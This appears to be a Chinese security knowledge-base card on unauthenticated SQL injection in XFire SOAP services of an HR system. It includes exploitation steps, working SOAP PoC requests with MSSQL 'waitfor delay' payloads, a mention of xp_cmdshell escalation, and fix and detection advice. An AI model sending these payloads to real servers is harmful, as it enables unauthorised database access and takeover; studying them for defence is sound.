---
id: web-java-framework-xfire-soap-parameter-sql-injection
title: XFire SOAP 参数直落 SQL 文本：预编译执行拼接语句导致未授权 SQL 注入（MSSQL 延时验证）
type: scenario
domain: web
path: web/generic/sqli
technique: java-soap-param-sql-concat-preparestatement
aliases:
- SOAP SQL 注入
- XFire SQL 注入
- 预编译仍注入
- HrpService processResult 注入
- getChangeUsers 注入
- waitfor delay 注入
tags:
- java
- soap
- xfire
- sqli
- mssql
- blind
- preparestatement
- dao
- unauth
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-17
  verified_at: '2026-11-08T09:13:50+08:00'
  notes: 已对照原文核对：图15 显示 cheakCode 用 select 1 from oper_user where username='+var1+' and password='+var2 字符串拼接，图16-20 显示 ContentDAO/BaseDAO/DBReader 把该完整语句直接 prepareStatement(sql) 且 values 为 null，预编译失效成立；图21 HrpService processResult 延时 5s、图22 HrService removeOrganization 延时 10s 的响应耗时分别为 5.128/10.178，与 payload 的 waitfor delay 对应，注入已实测（Database 分支 switch 默认 getMssqlData 也印证 MSSQL）。affected_versions 留空正确：原文未标注产品版本。未验证点：MSSQL 判断由 DBReader 分支与 waitfor 语法推断，原文未直接列出 DB 类型。
---

## 一句话结论

XFire 把 SOAP 的 `<argN>` 原样交给业务方法后，若 DAO 在拼好整条 SQL 字符串再调用 `prepareStatement(sql)`（没有占位符、也没有把参数绑定为值），预编译并不会阻止注入——攻击者把 `';waitfor delay '0:0:10'--` 放进参数，就能通过时间盲注确认并可继续取数。

## 原理

- **预编译的安全性来自"参数与语句分离"**：`PreparedStatement` 只有在 SQL 文本中使用 `?` 占位、再用 `setObject/setString` 绑定时，才保证参数值不会被当作语法。若代码写的是 `prepareStatement("select ... where name='" + param + "'")`，SQL 文本在提交给数据库前就已经成形，`?` 根本不存在，预编译只剩执行计划缓存的作用。
- **注入位置在 Service 到 DAO 的传递链**：`HrChangeInfoService.getChangeUsers(arg0,arg1,arg2)` 先调用 `cheakCode(arg1, arg2)` 做账号校验，`cheakCode` 内部是 `"select 1 from operuser where username='" + arg1 + "' and password='" + arg2 + "'"`；这条拼接 SQL 交给 `ContentDAO.search(String sql)` → `BaseDAO.search(sql, values)` → `DBReader.setSql(sql)` → `getData()` → `getMssqlData()`，最终 `this.conn.prepareStatement(this.sql, ...)`。`values` 全程为 `null`，`arg1` 只是字符串拼进 `sql`——校验环节本身就是注入点。
- **另一条 sink**：校验通过后 `arg0` 还会传给 `ChangeInfoInterfaces.getChangeUsersXML(conn, arg0)`，同样进入拼接 SQL，属同模式的第二个注入面。
- **为什么能确认是 MSSQL**：`DBReader.getData(int flag)` 按 `Sql_switcher.searchDbServer()` 分支，1 走 `getMssqlData()`（默认分支也是 MSSQL），延时函数用 `waitfor delay`，是 MSSQL 专有语法。
- **注入点不止一处**：同一产品中 `HrpService.processResult(arg0,arg1)`、`getHrInfoByID` 的多个参数、`HrService.removeOrganization(arg0)`，以及 `removeUser`、`changeUserOrg`、`getUsersByDeptId`、`batchAppend/batchUpdate/batchDelete`、`isExecuteSql` 等数十个方法都直接拼接参数，任一参数都可作为注入点。
- **为什么预编译没挡住**：`prepareStatement` 收到的是已经拼好的整条语句，没有 `?` 占位符，数据库把 `waitfor` 当作语句的一部分解析；`setObject(i+1, values.get(i))` 所在循环因 `values == null` 根本不执行。
- **为什么危害高**：这些终点位于认证 Filter 的 `/services/` 白名单内，未登录即可访问（见关联卡），因此是前台未授权注入；MSSQL 权限足够时可进一步 `xp_cmdshell` 命令执行。

## 触发条件

- 应用使用 XFire（或其它把公共方法暴露为 SOAP 的框架）且 `/services/*` 可达（通常同时存在认证白名单缺陷）。
- 业务方法把 SOAP 参数传入 SQL 拼接，最终以 `prepareStatement(拼接后的字符串)` 或 `Statement.execute` 执行。
- 数据库为 MSSQL（延时/堆叠语法可用）；其它数据库换用对应盲注语法（`pg_sleep`、`dbms_pipe.receive_message`、`sleep`）。
- 攻击者能构造合法 SOAP 信封并匹配命名空间与方法名。

## 利用步骤

1. 获取 `services.xml` 得到 service 名、namespace、`serviceClass`，反编译定位 public 方法及参数顺序。
2. 先用正常参数调用，观察返回结构与错误信息（是否回显 SQL 异常、是否 200 但空结果）。
3. 在疑似参数处插入单引号 `'`，观察是否报 SQL 语法错误或延迟；确认注入类型（报错/布尔/时间）。
4. 用时间盲注验证：`argN = x';waitfor delay '0:0:5'--`，对比响应耗时。
5. 逐步取数（库名、表名、`operuser` 等账号表），或按权限尝试堆叠/`xp_cmdshell`。
6. 其它方法逐一测试同一模式，避免只修一个入口。

## PoC

时间盲注（`HrChangeInfoService.getChangeUsers` 的 `arg1` 进入 `cheakCode` 的 `username='...'`）：

```http
POST /services/HrChangeInfoService HTTP/1.1
Host: target
Content-Type: application/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getChangeUsers>
         <arg0>1</arg0>
         <arg1>admin';waitfor delay '0:0:10'--</arg1>
         <arg2>1</arg2>
      </hr:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```

实际执行的语句变为 `select 1 from operuser where username='admin';waitfor delay '0:0:10'--' and password='1'`，响应在约 10 秒后返回「校验用户名密码错误」，延时即证明注入成立。

`HrpService.processResult` 的数字型上下文（用 `1);` 闭合）：

```http
POST /services/HrpService HTTP/1.1
Host: target
Content-Type: application/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:processResult>
         <arg0>
1);waitfor delay '0:0:5'--
</arg0>
         <arg1></arg1>
      </hr:processResult>
   </soapenv:Body>
</soapenv:Envelope>
```

`HrService.removeOrganization`：

```xml
<hr:removeOrganization>
  <arg0>aaaaaaaaaaaaaaaaaa';waitfor delay '0:0:10'--</arg0>
</hr:removeOrganization>
```

判定：请求耗时约等于延时值即注入成立；也可对照无延时 payload 的基线耗时。

## 变体与关联

- **变体（上下文）**：字符型 `'...'`、数字型 `1)`、`in (...)` 列表、`like`、`order by`；按报错信息选择闭合方式。
- **变体（数据库）**：MSSQL `waitfor delay`/`xp_cmdshell`、Oracle `dbms_pipe.receive_message`、MySQL `sleep()`、PostgreSQL `pg_sleep()`。
- **变体（入口）**：SOAP `<argN>`、REST JSON 字段、表单参数；本质相同——参数最终进入 SQL 文本。
- **关联**：[[web-java-framework-xfire-services-filter-whitelist-unauth-invoke]]（未授权入口）、[[web-java-framework-dwr-sql-exception-full-statement-disclosure]]（SQL 异常回显完整语句，便于定位注入点）。
- **边界**：真正使用占位符绑定（`?` + `setXxx`）、参数强制类型转换（如 `Integer.parseInt`）、ORM 参数化查询、数据库账号无堆叠权限时，利用受限。

## 检测与防御

- **修复**：所有 SQL 使用占位符，参数一律 `setString/setInt` 绑定；禁止把参数拼进 SQL 文本。动态表名/列名/排序方向用白名单映射，不拼接用户输入。
- **代码审计特征**：`prepareStatement(` 的实参是 `+` 拼接结果、`createStatement().execute(sql)`、DAO 层 `search(String sql)` 这类"只传 SQL 字符串、values 为空"的封装。
- **最小权限**：数据库账号去掉 `xp_cmdshell`、堆叠、文件读写、跨库查询权限；应用与数据库分网。
- **检测**：SOAP 请求体出现 `'`、`--`、`waitfor`、`sleep(`、`);` 等特征；同一接口响应耗时异常（数秒级固定延迟）；SQL 错误信息回显；未授权 `/services/*` 上的高频枚举。
